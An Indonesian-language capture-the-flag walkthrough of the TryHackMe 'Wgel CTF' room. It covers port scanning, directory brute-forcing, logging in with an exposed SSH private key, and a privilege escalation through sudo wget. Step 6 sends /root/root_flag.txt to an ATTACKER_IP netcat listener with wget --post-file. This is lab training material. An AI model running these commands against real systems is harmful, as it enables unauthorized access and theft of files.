## Wgel CTF — TryHackMe Walkthrough

Room ini dikategorikan sebagai **Easy**, fokus pada scanning, directory brute-forcing, dan privilege escalation untuk mendapatkan root access.

---

### 🎯 Tujuan
- Dapatkan **User Flag**
- Dapatkan **Root Flag**

---

### STEP 1 — Reconnaisance (Nmap Scan)

```bash
nmap -sV -sC -Pn -vv <TARGET_IP>
```

Hasil scan menunjukkan dua port terbuka: **Port 22 (SSH)** dan **Port 80 (HTTP)**.

---

### STEP 2 — Enumerasi Web (Port 80)

Buka browser, akses `http://<TARGET_IP>` → akan muncul halaman **default Apache**.

**Cek Source Code halaman:**
```
Klik kanan → View Page Source (Ctrl+U)
```

Di source code halaman tersebut, terdapat komentar menarik: `<!-- Jessie don't forget to update the website -->`. Ini mengindikasikan kemungkinan **username: jessie**.

---

### STEP 3 — Directory Brute Force (Gobuster)

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Akan ditemukan direktori tersembunyi **`/sitemap/`**.

Lanjut brute force di dalam `/sitemap/`:
```bash
gobuster dir -u http://<TARGET_IP>/sitemap/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Dari proses ini akan ditemukan direktori tersembunyi **`.ssh`**. Akses `http://<TARGET_IP>/sitemap/.ssh/` dan akan ada file **`id_rsa`** (private key SSH).

---

### STEP 4 — Download & Gunakan SSH Key

```bash
# Download key
wget http://<TARGET_IP>/sitemap/.ssh/id_rsa

# Set permission yang benar
chmod 600 id_rsa

# Login via SSH
ssh -i id_rsa jessie@<TARGET_IP>
```

Setelah masuk, ambil **User Flag**:
```bash
find / -name "user_flag.txt" 2>/dev/null
cat /home/jessie/Documents/user_flag.txt
```

---

### STEP 5 — Privilege Escalation (wget sudo)

Cek sudo privileges:
```bash
sudo -l
```

Akan ditemukan bahwa **`wget`** bisa dijalankan sebagai root.

---

### STEP 6 — Eksfiltrasi Root Flag via wget

Setup **netcat listener** di mesin attacker terlebih dahulu:

```bash
# Di mesin attacker (Kali/lokal)
nc -lvnp 4444
```

Lalu di mesin target, gunakan sudo wget untuk kirim root flag ke listener:
```bash
sudo wget --post-file=/root/root_flag.txt http://<ATTACKER_IP>:4444
```

Root flag akan muncul langsung di terminal netcat kamu.

---

### 📋 Ringkasan Alur

```
Nmap Scan
    ↓
Temukan Port 22 & 80
    ↓
Cek Source Code → Username: jessie
    ↓
Gobuster → /sitemap/.ssh/id_rsa
    ↓
SSH Login dengan id_rsa
    ↓
Ambil User Flag
    ↓
sudo -l → wget bisa dijalankan sebagai root
    ↓
Eksfiltrasi root flag via wget + netcat
    ↓
ROOT! 🎉
```

---

### 🛠️ Tools yang Digunakan

| Tool | Fungsi |
|---|---|
| `nmap` | Port scanning |
| `gobuster` | Directory brute force |
| `wget` | Download SSH key & eksfiltrasi flag |
| `ssh` | Remote login |
| `netcat (nc)` | Listener untuk menerima flag |

---

> 💡 **Key Takeaway:** Room ini mengajarkan pentingnya **tidak menyimpan SSH private key di direktori web publik** dan bahaya memberikan sudo permission pada tool seperti `wget` yang bisa digunakan untuk membaca file sensitif.
